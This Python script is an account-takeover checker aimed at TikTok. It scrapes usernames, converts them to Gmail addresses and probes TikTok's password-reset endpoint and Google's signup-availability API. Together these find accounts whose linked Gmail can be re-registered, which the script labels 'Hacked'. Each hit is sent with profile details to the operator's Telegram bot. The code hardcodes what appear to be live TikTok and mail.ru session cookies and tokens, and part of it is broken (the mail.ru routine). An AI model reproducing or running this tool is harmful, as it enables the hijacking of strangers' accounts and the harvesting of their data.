import requests
import json
import random
import time
import os
a = 0
r =0
rr=0
j=0
rrr=0
aa=0
aaa=0
aaaa=0
p = 0
m =0
n = 0
s = 0
b = 0
id2  = ('121212')
urlp = requests.get('https://pastebin.com/Lb2PH728').text
if id2 in urlp:
    os.system('cls'if os.name=='nt'else'clear')
else:
    def loginid():
        os.system('cls'if os.name=='nt'else'clear')
        urlpp = requests.get('https://pastebin.com/Lb2PH728').text
        ina = input('Cod Githup or MMVMVP : ')
        
        if ina in urlpp :
            print('DOne code ')
            os.system('cls'if os.name=='nt'else'clear')
            
        else:
            print('No Login....')
            os.system('cls'if os.name=='nt'else'clear')
            while True:
                loginid()
    loginid()


took = input('Enter Your ToKEN  Bot : ')   
idddd = input('Enter Your ID Accouint : ')
os.system('cls' if os.name=='nt'else'clear')
def gmail():
    
    global a,m,n,a,p,aaa,aaaa,aa,rr,rrr,r,j
    try:
        file = open('user.txt','r').read().splitlines()
    except FileNotFoundError as error:
        print('Error File')
        exit()
    for email in file:
        
        url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
        headers = {
            'host':'api2-19-h2.musical.ly',
            'connection':'keep-alive',
            'cookie':'sstore-idc=maliva; store-country-code=iq; odin_tt=056f31c10f8c82638f6d4d64669ad49e9c36d4946d5d596f433d7f2d75fa1592a21c201d712196d54ee4ae4e14ac8708eee32dc97c85c0a65510024ecc0698346f73ecab038b7160dbff96ced716b8af',
            'accept-Encoding':'gzip',
                'user-agent':'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ; SM-A022F; Build/RP1A.200720.012; Cronet/58.0.2991.0)',
                'connection': 'close'}
        data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
        try:
            ree = requests.post(url,headers=headers,data=data).text
        except requests.exceptions.ConnectionError as error:
            continue
        
        if ('"Sent successfully"') in ree:
            
            url3 ='https://android.clients.google.com/setup/checkavail'
            headers = {
                'Content-Length':'98',
                'Content-Type':'text/plain; charset=UTF-8',
                'Host':'android.clients.google.com',
                'Connection':'Keep-Alive',
                'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
            data= json.dumps({
                'username':email,
                'version':'3',
                'firstName':'AbaLahb',
                'lastName':'AbuJahl'})
            try:
                res=requests.post(url3,headers=headers,data=data)
            except requests.exceptions.ConnectionError as error:
                continue
            if res.json()['status'] =='USERNAME_UNAVAILABLE':
                p+=1
                os.system('cls' if os.name =='nt'else'clear')
                print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
            elif res.json()['status'] =='SUCCESS':
                a+=1
                os.system('cls' if os.name =='nt'else'clear')
                print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
                us11 = email.split('@')[0]
                ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
                ik = requests.get(ui).text
                nam = ik.split('name :')[1]
                name = nam.split('follower')[0]
                fo = nam.split('follower :')[1]
                fol = fo.split('following :')[0]
                fols = ik.split('following :')[1]
                fols1 = fols.split(' heart :')[0]
                lik = ik.split('heart :')[1]
                like = lik.split('bio :')[0]
                bi = ik.split('bio :')[1]
                bio = bi.split('id :')[0]
                id1 = ik.split('id :')[1]
                id = id1.split('posts : ')[0]
                vieod= ik.split('posts :')[1]
            
                #re2 = requests.get(url2,headers=head2).json()
                j+=1
                req = f'HIT : {j}\nName : {name}\nEmail : {email}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
                tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
                ru= requests.post(tlg)
               
                with open('true.txt','a') as f8:
                    f8.write(f'{req}\n')
                
        elif ('"Bind device by email failed"') in ree:
            m+=1
            os.system('cls' if os.name =='nt'else'clear')
            print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
def ru():
    file = open('ru.txt','r').read().splitlines
    for email in file :
        url = 'https://account.mail.ru/api/v1/user/exists'
        head3 ={
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '712',
            'content-type':' multipart/form-data; boundary=----WebKitFormBoundaryzIYHiZzhvytvxf1R',
            'cookie': 'act=1169d723dfff43e4a609727f6efbee6d; mrcu=23D2636612FF5E43C3885DE255C3; p=ALgAALNn1DIA; mtrc=%7B%22mytrackerid%22%3A0%7D; tmr_lvid=b29df83087f1752e303857de35844831; tmr_lvidTS=1667634013499; ph=pp_l=-1|pp_t=1667633923210; tmr_detect=0%7C1667634016012; c=YBNmYwAAAC+jmgMTAQAAvgAAAQAA; tmr_reqNum=6; VID=0ttCoP0_cxoD00000j1QL4YD:::0-0-0-8806bc3:CAASEFAlyckcwlHo9CcodOkHqgsaYBGTA7XY7mHPzs0qjJble96b_0ERhx9zxzUpPS4obfLyyNUrZF9OVWWE-6Ug_3vPs52ch6nfc4ppMgCz2N4gqAGjeg4KPYk0tCnlLurG_Wlixg-qbAn5mov4h--W89xkLw',
            'origin': 'https://account.mail.ru',
            'referer': 'https://account.mail.ru/signup?back=https%3A%2F%2Fe.mail.ru%2Fmessages%2Finbox%3Fauthid%3Dla3m6hm1.a2%26back%3D1%26dwhsplit%3Ds10273.b1ss12743s%26from%3Dlogin%26x-login-auth%3D1&dwhsplit=s10273.b1ss12743s&from=login',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'x-request-id': '63433ad6-fc08-38ae-1879-7dd6e6e424e',
            'x-requested-with': 'XMLHttpRequest'
        }
        data3 = {
            'email': f'{email}',
            'name': '{"first":"jjj","last":"sc"}',
            'birthdy': '{"day":4,"month":4,"year":1994}',
            'htmlencoded': 'false',
            'utm': '{}',
            'referrer': 'https://account.mail.ru/login'
        }
        try:
            
            r8 = requests.post(url,headers=head3,data=data3).json()
        except requests.exceptions.ConnectionError as error:
            continue
        tr = r8['body']['exists']
        if tr=='True':
            os.system()
    
    
    
    
def fol():
    global a,p,m
    lm ='qwertyuioplkjhgfdsazxcvbnm_'
    
    while True:
        us=str(''.join(random.choice(lm)for i in range(7))).lower()
       
        url1 =f'https://www.tiktok.com/api/search/general/preview/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.87&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_id=7160541228835522053&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=17&is_fullscreen=false&is_page_visible=true&keyword={us}&os=windows&priority_region=IQ&referer=https%3A%2F%2Fwww.tiktok.com%2F%401p3v%3Flang%3Den&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=900&screen_width=1600&tz_name=Asia%2FBaghdad&verifyFp=verify_la21xld1_d7Th6Zbn_htTX_4WEU_9YgK_6cqIkqgITOIY&webcast_language=en'
        hread1 ={
            'accept': '*/*',
            
            'accept-language': 'en-US,en;q=0.9',
            
            'cookie': '_ttp=2GftrOTPvOz42nD9pREjFcTuiGb; x-jupiter-uuid=16671934426736376; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227160541228835522053%22%2C%22timestamp%22:1667193449556}; passport_csrf_token=c3a7dcce4cbc87efe16fc2ec46081c77; passport_csrf_token_default=c3a7dcce4cbc87efe16fc2ec46081c77; tta_attr_id=0.1667458291.7161678825598779393; tta_attr_id_mirror=0.1667458291.7161678825598779393; _ga=GA1.1.2078512563.1667458301; _ga_HV1FL86553=GS1.1.1667458301.1.0.1667458306.55.0.0; tiktok_webapp_theme=dark; tt_csrf_token=TRFt9hla-AM0nK3ArNWcI8ElQye_OZkBCxHw; _abck=3C6F7216904663C60C96E5708586C000~-1~YAAQZDMTApB7jD+EAQAAA8g1RghUYc8QKIlxu9HsnnEKt/A9Im/EJIyshuj09Wh72WSlLOdMsS0vKqcEnDPI0nPOwMWxNB3dQ6Glb3pEIjMrHLC9fOw8rDu4h9am5nAp8y9KUOJ8boSuRh0R22nw2gg6dnIL7i+ekyQe3d4DYbTOKBCT0mz+gp90n2ojvtXslZCApGdWgjZIakRwp+k524nmRxNCP6KKtb6EYTQSQ4O8x6GbY8zLnhLFF4vyS1kuizkw95Wr3Sd/aOAhZD6SA+jtZMiSk+qLivEHHFXlqTmXXWoISJifQzcv5cZTHo3OGkGKHpoVHkEbZTrX4zw991E5NaifiRPOZOvNDjcj6Qgb8xwFSDPtKY62/4skOvIlrVtzTU/T9wTL+A==~-1~-1~-1; bm_sz=B876E6A1E48D95E0DC600E8C25EF33C3~YAAQZDMTApF7jD+EAQAAA8g1RhEmfiJ2TVVhXHaoUHlNbDQVqmsMkjbAQrD9YptTwRAN6Nwc8uiMH6UXgEtz48ssd2HH1vI0dndqXLljO+qZnSJW4RMwpXJYlQ2lwimGhNlex5WtwYCw9gGDVh3+x4MSSsEB38M+k1GrFbs37TAxgu5Foa55vO7AAEoY2oesKe4QRCoJ8W1T35VARBQs5u/lK3nwNVC/VWGFvaiUDMgIsMNBZVxxS4GeXve11vk7bVP2h5NYzV5SEOS6te58Y1imeWYhwkFY9GiZbn5fyHtvCUY=~3487031~3159861; s_v_web_id=verify_la3ni3fp_cBj8CzCv_oS66_4qEg_Bg9B_8u9ojG3PpadE; cmpl_token=AgQQAPOnF-RO0o2Fx4z5Ox0_-T7DfJfY_4csYMuC-w; sid_guard=f58913c59b94c0f53076c8deb7ab87e5%7C1667636144%7C5184000%7CWed%2C+04-Jan-2023+08%3A15%3A44+GMT; uid_tt=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; uid_tt_ss=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; sid_tt=f58913c59b94c0f53076c8deb7ab87e5; sessionid=f58913c59b94c0f53076c8deb7ab87e5; sessionid_ss=f58913c59b94c0f53076c8deb7ab87e5; sid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; ssid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=j4ZWVL3Yi34tUszZJaBk7skck1qXZy2I0gS5xPsc_meZG7S69Rzkyly3Dh6fXZaYKica8ddMfBJg4ex_-QUXziFRn5OTMYzfAcxvrfwkwhmveK5jwzQcGrEJIck7jKQi2i-v2jMtS93U_KM27bYzezTmws-FwfY74Vhm9B2yAL5xTabdt9ogRT4zTqg7XSJR9YcXOiu99mif3PomEatoPaoGEfrPfmP4sIKw-dggTyGAAVyxCksBmxLTNhqPPDoEsk832xtn0TQp3HdCw0pCyZQRUz8nPT6EL-bIBxbvBz5GBFlOvzuNo5UUH0muE_POKRhgUhzhJLheggJ0JJI7OV4Yor8zKrQrbHVrPksPsCZBC3j7vc64yPprTh1jNmJsVy0l6EWa7varGtpQ1k6FppG8JIQ1XxGr5_AIUbu7levtLC9jNmJfCH6KdviqCCjtgRzvXhHgo0jguXdnvnfmeLIoLGdItw9EU-xeI-ZHsbe0AX9WO3RNqdwJW9VgoE2u; passport_fe_beating_status=true; ttwid=1%7CDhGaolWaz087AfPx33t_h6T6dfNHRKseYR6CrXox-jI%7C1667636154%7C8d7708d63ef5c8964dba994c6f13b325250b65834e8578e6f4b2fa2d4cf1b99a; csrf_session_id=43080fca4516404ba63e6496231f261a; odin_tt=7318c85dc3fc11c7915a4389e36d3405e6141a185e793a51e6cf7f2830a512e148bc4fad6b065798134a652001b62ddb4e206399968bc2f0b0e894accb82b2e942dcf03cd3315c2801aa524b7097d244; msToken=SwrQ8oitPpetlig4U7GbQHfjMsqwU6KIumMDtt3-Gy7d5mqqCzr5w9R3YHlDIoR3sXTP4dS_W8csN0VEGX4Zo-k8QxdUJp3Sg3SAhU7pIkkOwq_Ex0Rat2sr7GdhWsa6VpcffwOSehGT5PCk8A==; msToken=uzn86nyCHFG2DKGJu6CaOoYlidWmI8SBjb9YRnadHfxXOOUUxn3ihBht7FNCbKvsQ9gt8MLxX47XANveT9LgigmlrYYWBHpzXpr1n2IIh83xyMEdMSAGCPd3PV83mo38rrDBHzBh1XFTKBvgsg==',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            
        }
        
        try:
            poo =requests.get(url1,headers=hread1).json()
        except requests.exceptions.ConnectionError as error:
            continue
        try:
            lL = len(poo['sug_list'][0]['word_record']['words_content'])
            for i in range(0,lL):
                l00 = str(poo['sug_list'][i]['content'])
                #l0= str(poo['sug_list'][0])
                
                a+=1
            
                os.system('cls' if os.name == 'nt' else 'clear')
                
                print(f'[=] - User : {us}\n[=] - Done : {a}\n[=] - Bad : {p}\n')
                try:
                    with open('user.txt','a') as f8:
                        f8.write(f'{l00}@gmail.com\n')
                except UnicodeEncodeError as error:
                    p+=1
                    
        except IndexError as error:
            p+=1
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'[=] - Done : {a}\n[=] - Bad : {p}\n')

def fol1():
    global a,p
    lm = 'zaidkaream_'
    while True:
        us11 = str(''.join(random.choice(lm)for o in range(3))).lower()
        
            
        url2 =f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.86&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7160541228835522053&device_platform=web_pc&focus_state=true&from_page=search&history_len=11&is_fullscreen=false&is_page_visible=true&keyword={us11}&os=windows&priority_region=&referer=https%3A%2F%2Fwww.tiktok.com%2Flogin&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=900&screen_width=1600&tz_name=Asia%2FBaghdad&webcast_language=en&msToken=9e4HbH6TYySh91Sh3tbNoud5gJoh4UDKwtlUPWdStx4RZOjBFtSQoDXHqB61wBgMfnKhfWcTMTty5Z17wAiUffVClPTijav1R1zfQmqSbD8-2ISi2eraBcUM_dWEciIhiw-oYyxB9H584eKo&X-Bogus=DFSzswVL6N0ANtdJS0gJtt-w3U2a&_signature=_02B4Z6wo00001Gqop.wAAIDAR5IyVKoX-qBqqKNAAHnXea'
        head2 ={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            #'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'cookie': '_ttp=2GftrOTPvOz42nD9pREjFcTuiGb; x-jupiter-uuid=16671934426736376; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227160541228835522053%22%2C%22timestamp%22:1667193449556}; passport_csrf_token=c3a7dcce4cbc87efe16fc2ec46081c77; passport_csrf_token_default=c3a7dcce4cbc87efe16fc2ec46081c77; tta_attr_id=0.1667458291.7161678825598779393; tta_attr_id_mirror=0.1667458291.7161678825598779393; _ga=GA1.1.2078512563.1667458301; _ga_HV1FL86553=GS1.1.1667458301.1.0.1667458306.55.0.0; tiktok_webapp_theme=dark; cmpl_token=AgQQAPOnF-RO0o2Fx4z5Ox0_-T7DfJfY_4csYMuCjQ; sid_guard=5c6e285edda28fe6bc3c566ed331e00d%7C1667642509%7C5184000%7CWed%2C+04-Jan-2023+10%3A01%3A49+GMT; uid_tt=926575facde5052eb3da985ad8c10cbe53e22413bc09102fbd4faa3312fe7dfc; uid_tt_ss=926575facde5052eb3da985ad8c10cbe53e22413bc09102fbd4faa3312fe7dfc; sid_tt=5c6e285edda28fe6bc3c566ed331e00d; sessionid=5c6e285edda28fe6bc3c566ed331e00d; sessionid_ss=5c6e285edda28fe6bc3c566ed331e00d; sid_ucp_v1=1.0.0-KGQyYjMwNWU3MzU5ZDc0MjA1MmZjNGY1OTk3NmYxZGM3Nzg3MzQ2ZTYKIAiGiKeIt6XK3V0QjemYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgNWM2ZTI4NWVkZGEyOGZlNmJjM2M1NjZlZDMzMWUwMGQ; ssid_ucp_v1=1.0.0-KGQyYjMwNWU3MzU5ZDc0MjA1MmZjNGY1OTk3NmYxZGM3Nzg3MzQ2ZTYKIAiGiKeIt6XK3V0QjemYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgNWM2ZTI4NWVkZGEyOGZlNmJjM2M1NjZlZDMzMWUwMGQ; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=kgNbHxhhqo-UMNEUF0ebQH48MiEn4q3EffM6ei_CGZF-kqKeye370cq9kjomeACzAz1hQQregEaL9O1ak37c2qbij7VOA1O6zlVhlhKLHfdIuwak9VGIS6XFw8QTocdGxCdDB1EgupmBwoxEuRs1vh60XCVMwQudkLxfnGd4Xn5msJ2Dt-wc39KBfSsf3optBc4QxS-yOmb9V_dlvRDDth2sCLCgYADGq7Fd4p7Ynxhim53M-qIi7Y0ZgnW3ny1O3FfgB1g1DiKSxdFRvy4aM8SQ80UQIVnC10xYTDBKGyGvqJdi3ylzSzQTVegRncS94bWHDfxCs7U7XyKSpnBrQWOi2Q8Aa2dn6lntCuOuJd3GmzlfC16GLqNgjWfuoT9p-YHaYhvcfRd2j2BLTgYE1jrILtXxLCNplZKhN2yBiDr-RaT_LlIRPB1oG57KXjgETuf3OS2ETSZYX96HwPIWKnflpqqSrkKbeXmsl1S2cu4RHMP8Y9gDI8xym9-Z9-w8; tt_csrf_token=NHrG6Rjc-hf7KaEpXeNc_Ys0cBdyfV7PjxaI; _abck=3C6F7216904663C60C96E5708586C000~-1~YAAQFjMTAj/MozyEAQAAsGiVSAjuqQQh52g/lAmh6YoTbN6/ZVDpY/Qlu7ApI2PLlpXHWS6UGDMKi7LpboT+VIFgKUr+xbyAHSQFOebiDH0Bkm0uc8VL3Gifqya3O7+9gFxvNRuxJ9IIaegIK2CF3pbH1skmwzvYyWCuqQHPO4848mUelFa80A+wYj9v5wYlo5LVhFDB+8Z8hoLbCyUZr61HnvRY1X0EHqYgvcO5Bvq0QrIRgEZ58r/DGA/xufwCQ++Ox7jfHwC76vhqUnRH9h2+FhAqR47u0iDNguEm7OffT4Y12nkCUxFC7HtqcEkjgQkFwamZufQK42+gosryubin69H+SEQTR3JZ02UXetxf+minQMxqRCwUIOopRVqNbvrNEYCQhBrGfw==~-1~-1~-1; bm_sz=E2FF76E9EC278282D046C91B0F11A03A~YAAQFjMTAkDMozyEAQAAsGiVSBGiHvs+m7Wv4ZqGUjcec5UFQrzLBJiQttpS13LR8zTGz9Vv7Pclo/tbvth0vvxkp8f9K/7svD1Xdc6UZbnEBNOMUD76PlTJMJ73oCzY5anp9RzoKqX18SjaOFdTxYtp9mxJrjXsjC+kbhMkLvE0UMvNYiPPEzCExvscKt2PdL1REL3zh+sQ2FN6Flxgr0lZvL5QQEnogrr8Nraj6ftmQWQLJNxJg0CYpguwOxGgNkboypMbIgBg1Wmx6vsVNjHV6psuMYy02gZB+eU1J1wH5Ak=~3356998~3553333; passport_fe_beating_status=true; ttwid=1%7CDhGaolWaz087AfPx33t_h6T6dfNHRKseYR6CrXox-jI%7C1667665075%7C45ed998454f6ad4d62fb5f4462dc610fa02675a580084eb68f900148952629f7; odin_tt=0c72d37786b25de9964e1476f59c2d3705d94b3b53bf642aa6f1f79e844e8df90207bd6418dc97318045276f5d6ba53d415e238a30c2995bed7102831d501b3be7d19d80b0acaed259cc8fd8a1de001f; msToken=I0aNsaOrIILGvH1w29bUCEpICuz0l6U9Vfl4C452j3mQF3Mm420GYlMEFJHZ_j1N2SirwkI2rWoFntgGdQ5zSsLRe7LNytjeBlJImyNuQ3rDV-kyg-A5WYmPB0wfylsEbt14-6FEOFVA_cL5; msToken=PGJHZV_kBlSYtb2KBma5VMky2s6QCZr17gNRD7t66b_nD4oeZ0DRarD_S53p2hg-_UwY3vi0j7c4l-95jkE5XOhI0C1PUYORxMO0t5NiXQD-jKrO1ishfBw4jODhIRDKmal1AaTmVFkuF3h1',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        }
        try:
            re2 = requests.get(url2,headers=head2).json()
        except requests.exceptions.ConnectionError as error :
            continue
        
        try:
            try:
            
                us1 = (len(re2['user_list'][0]['user_info']))
            
                
                for i in range(0,11):
                
                    us = re2['user_list'][i]['user_info']['unique_id']

                    a+=1
                    os.system('cls' if os.name=='nt'else'clear')
                    print(f'[-] - Done : {a}\n[-] - Bad : {p}\n[-] - User : {us}\n')
                    with open('user.txt','a') as f8:
                        f8.write(f'{us}@gmail.com\n')
            except IndexError as error:
                p+=1
                os.system('cls' if os.name=='nt'else'clear')
                print(f'[-] - Done : {a}\n[-] - Bad : {p}\n[-] - User : {us}\n')
                continue
        except KeyError as error:
            p+=1
            continue
                    
        
              

print('[1] - UserList\n[2] - UserList 2\n[3] - Cheker Email\n[0] - Remove File\n')
try:
    
    
    inp = int(input('[=] - Enter Your Choice : '))
    if inp == 1:
        fol()
    elif inp ==2:
        fol1()
    elif inp==3:
        gmail()

        try:
            
            os.remove('tokenid.txt')
        except FileNotFoundError as error:
            print('\nFile Error in Pc')
    elif inp ==0:
        try:
            os.remove('user.txt')
            print('Done Remove File')
            time.sleep(2)
            os.system('clear')
            exit()
            
            
        except FileNotFoundError as error :
            print('File No')
            time.sleep(2)
            exit()
except ValueError as error:
    print('Number Your Choice')
